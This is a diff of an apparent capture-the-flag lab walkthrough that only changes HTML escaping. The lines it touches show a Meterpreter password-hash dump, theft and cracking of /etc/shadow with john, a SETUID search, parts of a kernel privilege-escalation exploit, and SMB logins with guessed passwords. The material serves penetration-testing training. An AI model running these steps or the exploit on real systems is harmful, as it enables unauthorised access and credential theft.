@@ -345,15 +345,15 @@ Follow the directions in the README file.  Read them carefully.
 
 Follow the instructions in the flags exactly.  
 If you follow the instructions exactly, the memory errors, seg faults, and garbage text will go away.
-C:\>
+C:\&gt;
 </pre>
 
-Return to the Meterpreter prompt by running `exit`. Dump password hashes using `hashdump` at the `meterpreter>` prompt:
+Return to the Meterpreter prompt by running `exit`. Dump password hashes using `hashdump` at the `meterpreter&gt;` prompt:
 
 <pre>
-C:\>exit
+C:\&gt;exit
 exit
-meterpreter > hashdump
+meterpreter &gt; hashdump
 admin:1013:1858b18e0a139abd358f4be2befbcf0f:744488a3d6b77a8a76d0cf5d19baa6b2:::
 Administrator:500:452495d04f81e4c200b44745424c55eb:29affe6ea3732b9bc83c896c84311863:::
 falken:1011:4fbd4cea97c5752caad3b435b51404ee:2049b70ec5b6944aed5fef05bc4b1933:::
@@ -630,7 +630,7 @@ passwd                                                                          
 sec504@slingshot:~/10.10.10.45$ scp falken@10.10.10.45:/etc/shadow .
 falken@10.10.10.45's password: 
 shadow                                                                                                      100% 1421     1.4KB/s   00:00    
-sec504@slingshot:~/10.10.10.45$ unshadow passwd shadow >10.10.10.45.hash
+sec504@slingshot:~/10.10.10.45$ unshadow passwd shadow &gt;10.10.10.45.hash
 sec504@slingshot:~/10.10.10.45$ john 10.10.10.45.hash 
 Warning: detected hash type "md5crypt", but the string is also recognized as "aix-smd5"
 Use the "--format=aix-smd5" option to force loading these as that type instead
@@ -759,7 +759,7 @@ cat: /flag3.txt: Permission denied
 We can't access the flag because it is only accessible to _root_. We need a privilege escalation opportunity. We can search for SETUID root files:
 
 <pre>
-[bob@barney ~]$ find / -uid 0 -perm -4000 -print 2>/dev/null
+[bob@barney ~]$ find / -uid 0 -perm -4000 -print 2&gt;/dev/null
 /usr/sbin/userhelper
 /usr/sbin/mgnokiidev
 /usr/sbin/suexec
@@ -862,7 +862,7 @@ Now that we have privilege escalated to the apache user, we can examine the sour
 
 <pre>
 [bob@barney]/var/www/html% cat specialpage.php 
-<?php
+&lt;?php
 require("cookie.inc.php");
 //fix loopback redirect condition
 if ($user != 42)
@@ -870,14 +870,14 @@ if ($user != 42)
 	header("Location: index.php");
 	die();
 }
-?>
-<html><head><title>Target Widgets - Special Page</title></head>
-<body bgcolor="white">
-<h1>Target Widgets - Special Page</h1><hr>
+?&gt;
+&lt;html&gt;<head><title>Target Widgets - Special Page</title></head>
+&lt;body bgcolor="white"&gt;
+&lt;h1&gt;Target Widgets - Special Page</h1><hr>
 Hey...you're the administrator!  I guess you forgot your root password again,
 huh?  Well, that's okay!  Just use the km3 exploit (provided below) to get back in! (c:=
-<p><hr>
-<textarea rows="15" cols="70">
+&lt;p&gt;<hr>
+&lt;textarea rows="15" cols="70"&gt;
 /*
  * jessica_biel_naked_in_my_bed.c
  *
@@ -945,19 +945,19 @@ Copy and paste the exploit code into a file name ending in `.c`:
  * -static -Wno-format  
  */
 #define _GNU_SOURCE
-#include <stdio.h>
-#include <errno.h>
-#include <stdlib.h>
-#include <string.h>
-#include <malloc.h>
-#include <limits.h>
-#include <signal.h>
-#include <unistd.h>
-#include <sys/uio.h>
-#include <sys/mman.h>
-#include <asm/page.h>
+#include &lt;stdio.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;malloc.h&gt;
+#include &lt;limits.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/uio.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;asm/page.h&gt;
 #define __KERNEL__
-#include <asm/unistd.h>
+#include &lt;asm/unistd.h&gt;
 
 #define PIPE_BUFFERS	16
 #define PG_compound	14
@@ -1140,10 +1140,10 @@ int	main(int argc, char *argv[])
 	printf("[+] page: 0x%lx\n", pages[0]);
 	printf("[+] page: 0x%lx\n", pages[1]);
 
-	pages[0]->flags    = 1 << PG_compound;
-	pages[0]->private  = (unsigned long) pages[0];
-	pages[0]->count    = 1;
-	pages[1]->lru.next = (long) kernel_code;
+	pages[0]-&gt;flags    = 1 << PG_compound;
+	pages[0]-&gt;private  = (unsigned long) pages[0];
+	pages[0]-&gt;count    = 1;
+	pages[1]-&gt;lru.next = (long) kernel_code;
 
 	/*****/
 	pages[2] = *(void **) pages[0];
@@ -1160,10 +1160,10 @@ int	main(int argc, char *argv[])
 	printf("[+] page: 0x%lx\n", pages[2]);
 	printf("[+] page: 0x%lx\n", pages[3]);
 
-	pages[2]->flags    = 1 << PG_compound;
-	pages[2]->private  = (unsigned long) pages[2];
-	pages[2]->count    = 1;
-	pages[3]->lru.next = (long) kernel_code;
+	pages[2]-&gt;flags    = 1 << PG_compound;
+	pages[2]-&gt;private  = (unsigned long) pages[2];
+	pages[2]-&gt;count    = 1;
+	pages[3]-&gt;lru.next = (long) kernel_code;
 
 	/*****/
 	pages[4] = *(void **) &(int[2]){PAGE_SIZE,0};
@@ -1333,11 +1333,11 @@ Failed. Try with _bob_:
 [bob@fred ~]$ smbclient -U bob //10.10.10.15/c
 Password: 
 Domain=[WILMA] OS=[Windows Server 2008 R2 Standard 7600] Server=[Windows Server 2008 R2 Standard 6.1]
-smb: \> dir
+smb: \&gt; dir
 NT_STATUS_ACCESS_DENIED listing \*
 
 		48947 blocks of size 524288. 26614 blocks available
-smb: \> 
+smb: \&gt; 
 </pre>
 
 Closer, but still no. Bob lacks file system permissions, but he can access the share.
@@ -1348,7 +1348,7 @@ Try other user account, eventually getting to `susan` with the password `passwor
 [bob@fred ~]$ smbclient -U susan //10.10.10.15/c
 Password: 
 Domain=[WILMA] OS=[Windows Server 2008 R2 Standard 7600] Server=[Windows Server 2008 R2 Standard 6.1]
-smb: \> dir
+smb: \&gt; dir
   $Recycle.Bin                      DHS        0  Mon Jul 13 22:34:39 2009
   Documents and Settings            DHS        0  Tue Jul 14 01:06:44 2009
   firefox                             D        0  Sun May  5 10:49:19 2013
@@ -1367,9 +1367,9 @@ smb: \> dir
   Windows                             D        0  Tue Oct 17 17:26:28 2017
 
 		48947 blocks of size 524288. 26614 blocks available
-smb: \> get flag2.txt
+smb: \&gt; get flag2.txt
 getting file \flag2.txt of size 67 as flag2.txt (65.4 kb/s) (average 65.4 kb/s)
-smb: \> exit
+smb: \&gt; exit
 [bob@fred ~]$ cat flag2.txt 
 Analyze the nc4 program from the course DVD in the Linux directory.[bob@fred ~]$ 
 </pre>
